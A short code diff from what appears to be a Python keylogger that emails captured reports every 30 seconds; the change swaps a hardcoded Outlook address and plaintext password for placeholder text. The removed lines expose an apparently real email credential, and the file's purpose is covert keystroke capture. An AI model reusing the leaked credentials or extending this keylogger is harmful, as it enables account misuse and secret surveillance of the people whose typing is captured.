@@ -9,8 +9,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 30  # in seconds
-EMAIL_ADDRESS = "kunalmannu123@outlook.com"
-EMAIL_PASSWORD = "nYbdUUmX763Ejx7"
+EMAIL_ADDRESS = "your outlook email"
+EMAIL_PASSWORD = "your password"
 
 
 class Keylogger:
